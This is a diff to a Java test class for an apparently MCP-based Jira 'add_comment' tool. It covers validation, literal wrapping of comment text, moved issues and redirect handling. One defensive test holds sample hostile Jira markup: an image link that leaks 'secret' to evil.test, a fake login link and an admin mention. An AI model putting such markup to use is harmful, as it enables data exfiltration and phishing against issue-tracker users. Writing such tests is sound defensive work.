@@ -27,12 +27,14 @@ class AddCommentToolTest extends ServerTestSupport {
             assertThat(json(result).at("/commentId").asString()).isEqualTo("10500");
             assertThat(text(result)).doesNotContain("jkowalski@corp.test", "(echo)");
         }
-        assertThat(BACKEND.requests()).singleElement().satisfies(request -> {
+        assertThat(BACKEND.requests()).extracting(StubBackend.Request::path)
+                .containsExactly("/rest/api/2/issue/ABC-1", "/rest/api/2/issue/ABC-1/comment");
+        assertThat(BACKEND.requests().getLast()).satisfies(request -> {
             assertThat(request.method()).isEqualTo("POST");
             assertThat(request.path()).isEqualTo("/rest/api/2/issue/ABC-1/comment");
             assertThat(request.authorization()).isEqualTo(PAT);
             assertThat(JSON.readTree(request.body()).at("/body").asString())
-                    .isEqualTo("Reproduced on staging.\nSee logs.");
+                    .isEqualTo("{noformat}\nReproduced on staging.\nSee logs.\n{noformat}");
         });
     }
 
@@ -73,14 +75,60 @@ class AddCommentToolTest extends ServerTestSupport {
     void invalidArgumentsAreRejectedBeforeJira() {
         try (McpSyncClient client = clientWithCredential(PAT)) {
             assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "abc-1", "body", "x")),
-                    "issueKey must be");
+                    "issueKey does not match the required format");
             assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "   ")),
                     "body must be");
             assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "a\u0000b")),
-                    "body must be");
-            assertThat(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "x".repeat(10_001))).isError())
-                    .isTrue();
+                    "body contains control characters");
+            assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "x".repeat(10_001))),
+                    "body is longer than 10000 characters");
         }
         assertThat(BACKEND.requests()).isEmpty();
+    }
+
+    @Test
+    void markupThatMakesRequestsOrNotificationsReachesJiraAsLiteralText() {
+        String body = "see !https://evil.test/p.png?d=secret! [click|https://evil.test/login] [~admin] "
+                + "{noformat}!https://evil.test/again.png!";
+        try (McpSyncClient client = clientWithCredential(PAT)) {
+            assertThat(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", body)).isError()).isFalse();
+        }
+        String sent = JSON.readTree(BACKEND.requests().get(1).body()).at("/body").asString();
+        assertThat(sent).startsWith("{noformat}\n").endsWith("\n{noformat}");
+        String inside = sent.substring("{noformat}\n".length(), sent.length() - "\n{noformat}".length());
+        assertThat(inside).contains("!https://evil.test/p.png?d=secret!", "[click|https://evil.test/login]", "[~admin]");
+        assertThat(inside).as("the text cannot close the literal block").doesNotContainIgnoringCase("{noformat}");
+    }
+
+    @Test
+    void aMovedIssueIsWrittenUnderItsNewKeyAndReportedWithIt() {
+        try (McpSyncClient client = clientWithCredential(PAT)) {
+            McpSchema.CallToolResult result = call(client, "add_comment",
+                    Map.of("issueKey", "ABC-3", "body", "Moved, still relevant."));
+
+            assertThat(result.isError()).isFalse();
+            assertThat(json(result).at("/issueKey").asString()).isEqualTo("DEF-5");
+        }
+        assertThat(BACKEND.requests()).extracting(StubBackend.Request::method, StubBackend.Request::path)
+                .containsExactly(org.assertj.core.groups.Tuple.tuple("GET", "/rest/api/2/issue/ABC-3"),
+                        org.assertj.core.groups.Tuple.tuple("POST", "/rest/api/2/issue/DEF-5/comment"));
+    }
+
+    @Test
+    void aRedirectIsNotFollowedAndNotReadAsMissing() {
+        try (McpSyncClient client = clientWithCredential(PAT)) {
+            McpSchema.CallToolResult result = call(client, "add_comment", Map.of("issueKey", "ABC-9", "body", "x"));
+
+            assertThat(text(result)).contains("\"error\":\"internal_error\"");
+            assertThat(BACKEND.elsewhereHits()).as("the PAT must not follow the Location").isEmpty();
+        }
+    }
+
+    @Test
+    void aCommentAnswerWithoutIdIsTheBackendsFault() {
+        try (McpSyncClient client = clientWithCredential(PAT)) {
+            assertThat(text(call(client, "add_comment", Map.of("issueKey", "ABC-17", "body", "x"))))
+                    .contains("\"error\":\"internal_error\"");
+        }
     }
 }
